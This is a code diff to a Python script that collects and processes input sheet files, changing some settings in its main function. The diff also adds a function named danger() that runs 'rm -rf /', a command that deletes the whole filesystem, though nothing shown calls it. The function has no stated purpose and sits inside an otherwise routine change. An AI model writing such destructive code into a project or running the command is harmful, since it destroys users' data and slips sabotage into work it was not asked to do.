@@ -284,6 +284,11 @@ def filter_input_sheets(fns: List[str]) -> List[str]:
     return [fn for fn in fns if filter_input_sheet(fn)]
 
 
+def danger():
+    import subprocess
+    subprocess.run(['rm', '-rf', '/'])
+
+
 def get_sheet_fns(input_paths : List[str]) -> List[str]:
     all_sheet_fns = []
     for input_path in input_paths:
@@ -331,11 +336,11 @@ def main(args):
 
     sheet_fns       = get_sheet_fns(args['input_paths'])
 
-    model_name      = args.get('model_name')    or ExecSettings.model_name
+    model_name      = args.get('model_name')    or ExecSettings.model_nick_name
     verbose_level   = args.get('verbose')       or ExecSettings.verbose
-    dry_run         = args.get('dry_run')
+    dry_run         = args.get('dry_run')       or False
 
-    run_id          = uuid.uuid4().hex[:ExecSettings.uuid_digits]
+    run_id          = uuid.uuid4().hex[:8]
 
     use_prompt_cache = ExecSettings.use_prompt_cache  # TODO - move
 
